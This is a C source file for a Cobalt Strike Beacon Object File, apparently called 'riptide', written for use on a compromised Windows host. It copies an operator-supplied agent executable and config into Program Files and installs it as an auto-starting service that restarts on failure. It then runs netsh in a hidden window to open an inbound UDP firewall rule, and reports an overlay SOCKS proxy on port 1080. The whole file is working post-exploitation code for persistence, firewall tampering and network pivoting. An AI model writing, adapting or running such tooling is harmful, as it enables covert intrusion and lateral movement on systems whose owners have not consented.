#include "beacon.h"
#include <windows.h>
#include <winsvc.h>

#ifndef SC_MANAGER_CREATE_SERVICE
#define SC_MANAGER_CREATE_SERVICE 0x0002
#endif
#ifndef SERVICE_WIN32_OWN_PROCESS
#define SERVICE_WIN32_OWN_PROCESS 0x00000010
#endif
#ifndef SERVICE_AUTO_START
#define SERVICE_AUTO_START 0x00000002
#endif
#ifndef SERVICE_ERROR_NORMAL
#define SERVICE_ERROR_NORMAL 0x00000001
#endif
#ifndef SERVICE_ALL_ACCESS
#define SERVICE_ALL_ACCESS 0xF01FF
#endif
#ifndef ERROR_SERVICE_EXISTS
#define ERROR_SERVICE_EXISTS 1073
#endif
#ifndef ERROR_SERVICE_ALREADY_RUNNING
#define ERROR_SERVICE_ALREADY_RUNNING 1056
#endif
#ifndef SERVICE_CONFIG_FAILURE_ACTIONS
#define SERVICE_CONFIG_FAILURE_ACTIONS 2
#endif
#ifndef SERVICE_CONFIG_DELAYED_AUTO_START_INFO
#define SERVICE_CONFIG_DELAYED_AUTO_START_INFO 3
#endif
#ifndef SC_ACTION_RESTART
#define SC_ACTION_RESTART 1
#endif

WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
WINBASEAPI BOOL WINAPI KERNEL32$CopyFileA(LPCSTR, LPCSTR, BOOL);
WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
WINADVAPI BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR *);
WINADVAPI BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$ChangeServiceConfig2A(SC_HANDLE, DWORD, LPVOID);
WINBASEAPI int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *);
WINBASEAPI int __cdecl MSVCRT$_strnicmp(const char *, const char *, size_t);
WINBASEAPI int __cdecl MSVCRT$atoi(const char *);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);

#ifndef GENERIC_READ
#define GENERIC_READ 0x80000000L
#endif
#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ 0x00000001
#endif
#ifndef OPEN_EXISTING
#define OPEN_EXISTING 3
#endif
#ifndef INVALID_HANDLE_VALUE
#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)
#endif
#ifndef INVALID_FILE_SIZE
#define INVALID_FILE_SIZE ((DWORD)0xFFFFFFFF)
#endif
#ifndef MEM_COMMIT
#define MEM_COMMIT 0x1000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE 0x2000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE 0x8000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE 0x04
#endif
#ifndef CREATE_NO_WINDOW
#define CREATE_NO_WINDOW 0x08000000
#endif
#ifndef STARTF_USESHOWWINDOW
#define STARTF_USESHOWWINDOW 0x00000001
#endif

#ifndef INVALID_FILE_ATTRIBUTES
#define INVALID_FILE_ATTRIBUTES ((DWORD)-1)
#endif

typedef struct _SC_ACTION_B {
    DWORD Type;
    DWORD Delay;
} SC_ACTION_B;

typedef struct _SERVICE_FAILURE_ACTIONS_B {
    DWORD dwResetPeriod;
    LPSTR lpRebootMsg;
    LPSTR lpCommand;
    DWORD cActions;
    SC_ACTION_B *lpsaActions;
} SERVICE_FAILURE_ACTIONS_B;

typedef struct _SERVICE_DELAYED_AUTO_START_INFO_B {
    BOOL fDelayedAutostart;
} SERVICE_DELAYED_AUTO_START_INFO_B;

static int nonempty(const char *s)
{
    return s && s[0];
}

static int parse_listen_port(const char *s)
{
    const char *p;
    if (!s)
        return 0;
    for (p = s; *p; p++) {
        if (p != s && p[-1] != '\n' && p[-1] != '\r')
            continue;
        while (*p == ' ' || *p == '\t')
            p++;
        if (MSVCRT$_strnicmp(p, "ListenPort", 10) != 0)
            continue;
        p += 10;
        while (*p == ' ' || *p == '\t')
            p++;
        if (*p != '=')
            continue;
        p++;
        while (*p == ' ' || *p == '\t')
            p++;
        return MSVCRT$atoi(p);
    }
    return 0;
}

static int conf_listen_port(const char *path)
{
    HANDLE h;
    DWORD n = 0, sz;
    char *buf;
    int port;

    h = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return 0;
    sz = KERNEL32$GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0 || sz > 65536) {
        KERNEL32$CloseHandle(h);
        return 0;
    }
    buf = (char *)KERNEL32$VirtualAlloc(NULL, sz + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        KERNEL32$CloseHandle(h);
        return 0;
    }
    if (!KERNEL32$ReadFile(h, buf, sz, &n, NULL)) {
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(h);
        return 0;
    }
    buf[n] = 0;
    KERNEL32$CloseHandle(h);
    port = parse_listen_port(buf);
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
    return port;
}

static void open_udp(int port)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[640];
    DWORD code = 1;
    unsigned i;
    char *p;

    if (port <= 0 || port > 65535)
        return;
    p = (char *)&si;
    for (i = 0; i < sizeof(si); i++)
        p[i] = 0;
    p = (char *)&pi;
    for (i = 0; i < sizeof(pi); i++)
        p[i] = 0;
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    MSVCRT$_snprintf(
        cmd,
        sizeof(cmd),
        "C:\\Windows\\System32\\netsh.exe advfirewall firewall add rule name=RiptideWG-%d dir=in action=allow protocol=UDP localport=%d profile=any",
        port,
        port);
    if (!KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] netsh udp/%d err=%u\n", port, KERNEL32$GetLastError());
        return;
    }
    KERNEL32$WaitForSingleObject(pi.hProcess, 15000);
    KERNEL32$GetExitCodeProcess(pi.hProcess, &code);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    if (code == 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] firewall udp/%d inbound allow\n", port);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] firewall udp/%d netsh exit=%u (rule may already exist)\n", port, code);
}

void go(char *args, int len)
{
    datap parser;
    char *src_exe;
    char *src_conf;
    char *svc;
    char pf[MAX_PATH];
    char dest_dir[MAX_PATH];
    char dest_exe[MAX_PATH];
    char dest_conf[MAX_PATH];
    char binpath[MAX_PATH * 2];
    SC_HANDLE scm, hsvc;
    DWORD err;
    int listen;
    SC_ACTION_B actions[3];
    SERVICE_FAILURE_ACTIONS_B fa;
    SERVICE_DELAYED_AUTO_START_INFO_B delayed;

    BeaconDataParse(&parser, args, len);
    src_exe = BeaconDataExtract(&parser, NULL);
    src_conf = BeaconDataExtract(&parser, NULL);
    svc = BeaconDataExtract(&parser, NULL);

    if (!nonempty(src_exe)) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] need src exe path\n");
        return;
    }
    if (!nonempty(svc))
        svc = "RiptideAgent";

    if (KERNEL32$GetFileAttributesA(src_exe) == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] exe missing %s err=%u\n", src_exe, KERNEL32$GetLastError());
        return;
    }

    if (!KERNEL32$GetEnvironmentVariableA("ProgramFiles", pf, MAX_PATH)) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] ProgramFiles err=%u\n", KERNEL32$GetLastError());
        return;
    }
    MSVCRT$_snprintf(dest_dir, MAX_PATH, "%s\\Riptide", pf);
    MSVCRT$_snprintf(dest_exe, MAX_PATH, "%s\\riptide-agent.exe", dest_dir);
    MSVCRT$_snprintf(dest_conf, MAX_PATH, "%s\\peer.conf", dest_dir);
    KERNEL32$CreateDirectoryA(dest_dir, NULL);

    if (!KERNEL32$CopyFileA(src_exe, dest_exe, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] CopyFile exe err=%u\n", KERNEL32$GetLastError());
        return;
    }
    if (nonempty(src_conf)) {
        if (!KERNEL32$CopyFileA(src_conf, dest_conf, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[riptide] CopyFile conf err=%u\n", KERNEL32$GetLastError());
            return;
        }
    }

    MSVCRT$_snprintf(binpath, sizeof(binpath), "\"%s\" --config \"%s\"", dest_exe, dest_conf);

    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] OpenSCManager err=%u (need SYSTEM/admin)\n", KERNEL32$GetLastError());
        return;
    }

    hsvc = ADVAPI32$CreateServiceA(
        scm,
        svc,
        svc,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        binpath,
        NULL,
        NULL,
        NULL,
        "NT AUTHORITY\\NetworkService",
        NULL);
    if (!hsvc) {
        err = KERNEL32$GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hsvc = ADVAPI32$OpenServiceA(scm, svc, SERVICE_ALL_ACCESS);
        }
        if (!hsvc) {
            BeaconPrintf(CALLBACK_ERROR, "[riptide] CreateService err=%u\n", err);
            ADVAPI32$CloseServiceHandle(scm);
            return;
        }
    }

    delayed.fDelayedAutostart = TRUE;
    ADVAPI32$ChangeServiceConfig2A(hsvc, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &delayed);

    actions[0].Type = SC_ACTION_RESTART;
    actions[0].Delay = 5000;
    actions[1].Type = SC_ACTION_RESTART;
    actions[1].Delay = 5000;
    actions[2].Type = SC_ACTION_RESTART;
    actions[2].Delay = 5000;
    fa.dwResetPeriod = 86400;
    fa.lpRebootMsg = NULL;
    fa.lpCommand = NULL;
    fa.cActions = 3;
    fa.lpsaActions = actions;
    ADVAPI32$ChangeServiceConfig2A(hsvc, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);

    if (!ADVAPI32$StartServiceA(hsvc, 0, NULL)) {
        err = KERNEL32$GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            BeaconPrintf(CALLBACK_ERROR, "[riptide] StartService err=%u\n", err);
            ADVAPI32$CloseServiceHandle(hsvc);
            ADVAPI32$CloseServiceHandle(scm);
            return;
        }
    }

    listen = conf_listen_port(dest_conf);
    if (listen > 0)
        open_udp(listen);

    if (listen > 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] HUB service %s running  exe=%s  udp/%d  overlay SOCKS :1080\n", svc, dest_exe, listen);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] service %s running  exe=%s  overlay SOCKS :1080\n", svc, dest_exe);
    ADVAPI32$CloseServiceHandle(hsvc);
    ADVAPI32$CloseServiceHandle(scm);
}
